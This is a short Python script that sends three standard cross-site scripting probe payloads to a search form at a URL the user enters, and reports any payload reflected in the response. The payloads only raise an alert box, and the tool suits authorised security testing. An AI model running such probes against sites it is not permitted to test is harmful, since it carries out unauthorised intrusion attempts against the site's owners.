# xss_tester.py
import requests

def test_xss(url, payloads):
    for payload in payloads:
        data = {
            'search': payload
        }
        response = requests.post(url, data=data)
        if payload in response.text:
            print(f"Possible XSS vulnerability with payload: {payload}")

if __name__ == "__main__":
    target_url = input("Enter the form submission URL: ")
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "\"><script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
    ]
    test_xss(target_url, xss_payloads)
